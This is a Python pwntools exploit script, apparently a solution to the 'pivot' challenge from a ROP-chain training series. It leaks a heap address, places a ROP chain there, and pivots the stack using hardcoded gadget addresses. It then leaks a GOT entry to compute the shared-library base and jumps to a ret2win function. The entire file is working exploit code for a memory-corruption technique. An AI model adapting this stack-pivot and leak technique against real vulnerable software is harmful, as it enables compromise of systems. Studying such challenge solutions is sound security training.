import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "pivot"
BUFFER_LEN = 40

junk = b"\x90" * BUFFER_LEN

e = ELF(f"./{BINARY_NAME}")
io = process(e.path)

# Gadgets
xch_gad     = p64(0x0400b02) # xchg rax, rsp; ret;
pop_rax     = p64(0x0400b00) # pop rax; ret;
pop_rdi     = p64(0x0400b73) # pop rdi; ret;
pop_rsi_r15 = p64(0x0400b71) # pop rsi; pop r15; ret;

# Pointers
foot_plt    = p64(e.plt[b'foothold_function'])
foot_got    = p64(e.got[b'foothold_function'])
puts_plt    = p64(e.plt[b'puts'])
main_ptr    = p64(e.symbols[b'main'])

# Offsets
foot_offset = 0x970
ret2_offset = 0xabe

io.recvuntil("pivot: ")
heap_ptr = p64(int(io.recvuntil("\n").strip(), 16))
print(f"[!] Provided heap pointer: {heap_ptr}\n")

# Heap payload
payload = b""
payload += foot_plt
payload += pop_rdi
payload += foot_got
payload += puts_plt
payload += main_ptr

io.recvuntil("> ")
io.sendline(payload)

# Stack pivot exploit
payload = b""
payload += junk
payload += pop_rax
payload += heap_ptr
payload += xch_gad

io.recvuntil("> ")
io.sendline(payload)

# Retriving leaked address
io.recvuntil("foothold into libpivot.so")
foot_leak = io.recvuntil("\n").strip().ljust(8, b'\x00')
foot_leak = u64(foot_leak)

lib_base = foot_leak - foot_offset
ret2_addr = p64(lib_base + ret2_offset)

print("[!] Foothold_function leak: ", p64(foot_leak))
print("[!] LIB base address: ", p64(lib_base))
print("[!] ret2win address", ret2_addr)
print()

payload = b""
payload += junk
payload += ret2_addr

io.recvuntil("> ")
io.sendline(payload)

# io.interactive()
shared_pwn._recvall(io)
